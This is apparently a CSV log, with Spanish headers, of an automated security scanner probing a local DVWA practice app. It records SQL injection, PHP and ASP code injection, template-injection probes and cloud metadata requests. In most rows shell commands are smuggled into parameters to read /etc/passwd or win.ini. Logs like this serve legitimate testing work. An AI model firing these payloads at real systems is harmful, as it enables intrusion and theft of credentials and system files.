ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
113,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+UNION+ALL+select+NULL+--+,302,Found,1,628,0
114,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+UNION+ALL+select+NULL+--+,302,Found,1,628,0
115,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22+UNION+ALL+select+NULL+--+,302,Found,1,628,0
116,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%29+UNION+ALL+select+NULL+--+,302,Found,1,628,0
117,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%29+UNION+ALL+select+NULL+--+,302,Found,1,628,0
118,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
119,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,3,224,366
120,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22&Submit=Submit,302,Found,3,628,0
121,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27&Submit=Submit,302,Found,2,628,0
122,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D&Submit=Submit,302,Found,1,628,0
123,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C&Submit=Submit,302,Found,1,628,0
124,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B&Submit=Submit,302,Found,1,628,0
125,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%2Bresponse.write%28931%2C583*553%2C682%29%2B%22&Submit=Submit,302,Found,1,628,0
126,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B&Submit=Submit,302,Found,1,628,0
127,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=response.write%28931%2C583*553%2C682%29&Submit=Submit,302,Found,1,628,0
128,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,302,Found,1,628,0
129,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,302,Found,1,628,0
130,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,302,Found,1,628,0
131,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,302,Found,1,628,0
132,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,302,Found,0,628,0
133,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2Bresponse.write%28839%2C311*943%2C382%29%2B%22,302,Found,1,628,0
134,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,302,Found,1,628,0
135,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=response.write%28839%2C311*943%2C382%29,302,Found,1,628,0
136,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=cat+%2Fetc%2Fpasswd&Submit=Submit,302,Found,1,628,0
137,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26cat+%2Fetc%2Fpasswd%26&Submit=Submit,302,Found,1,628,0
138,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,5,224,366
139,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bcat+%2Fetc%2Fpasswd%3B&Submit=Submit,302,Found,1,628,0
140,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26cat+%2Fetc%2Fpasswd%26%22&Submit=Submit,302,Found,2,628,0
141,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bcat+%2Fetc%2Fpasswd%3B%22&Submit=Submit,302,Found,0,628,0
142,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26cat+%2Fetc%2Fpasswd%26%27&Submit=Submit,302,Found,1,628,0
143,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bcat+%2Fetc%2Fpasswd%3B%27&Submit=Submit,302,Found,2,628,0
144,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
145,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,2,628,0
146,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
147,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&Submit=Submit,302,Found,1,628,0
148,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
149,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&Submit=Submit,302,Found,4,628,0
150,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
151,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=get-help&Submit=Submit,302,Found,1,628,0
152,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help&Submit=Submit,302,Found,1,628,0
153,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bget-help&Submit=Submit,302,Found,1,628,0
154,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bget-help&Submit=Submit,302,Found,2,628,0
155,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help+%23&Submit=Submit,302,Found,1,628,0
156,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=cat+%2Fetc%2Fpasswd,302,Found,0,628,0
157,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26cat+%2Fetc%2Fpasswd%26,302,Found,1,628,0
158,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bcat+%2Fetc%2Fpasswd%3B,302,Found,1,628,0
159,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26cat+%2Fetc%2Fpasswd%26%22,302,Found,1,628,0
160,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bcat+%2Fetc%2Fpasswd%3B%22,302,Found,1,628,0
161,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26cat+%2Fetc%2Fpasswd%26%27,302,Found,0,628,0
162,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bcat+%2Fetc%2Fpasswd%3B%27,302,Found,1,628,0
163,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,0,628,0
164,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
165,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
166,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,302,Found,1,628,0
167,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
168,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,302,Found,0,628,0
169,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
170,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=get-help,302,Found,1,628,0
171,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help,302,Found,1,628,0
172,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bget-help,302,Found,1,628,0
173,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bget-help,302,Found,1,628,0
174,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help+%23,302,Found,1,628,0
175,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%27&Submit=Submit,302,Found,1,628,0
176,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,243,366
177,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--&Submit=Submit,302,Found,2,628,0
178,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%5D%5D%3E&Submit=Submit,302,Found,2,628,0
179,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%27,302,Found,1,628,0
180,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--,302,Found,1,628,0
181,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%5D%5D%3E,302,Found,0,628,0
182,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
183,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
184,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,3,161,317
185,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,0,161,317
186,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/computeMetadata/v1/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
187,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/computeMetadata/v1/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,326
188,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/opc/v1/instance/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
189,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/opc/v1/instance/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,326
190,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj+1187*6926+zj&Submit=Submit,302,Found,0,628,0
191,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,0,161,317
192,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/latest/meta-data/?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,321
193,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B5392*6345%7Dzj&Submit=Submit,302,Found,1,628,0
194,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/metadata/instance?id=1%27+OR+%271%27%3D%271&Submit=Submit,404,Not Found,1,161,317
195,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%24%7B7474*2087%7Dzj&Submit=Submit,302,Found,2,628,0
196,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%23%7B5011*1592%7Dzj&Submit=Submit,302,Found,1,628,0
197,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=zj%7B%235268*8769%7Dzj&Submit=Submit,302,Found,1,628,0
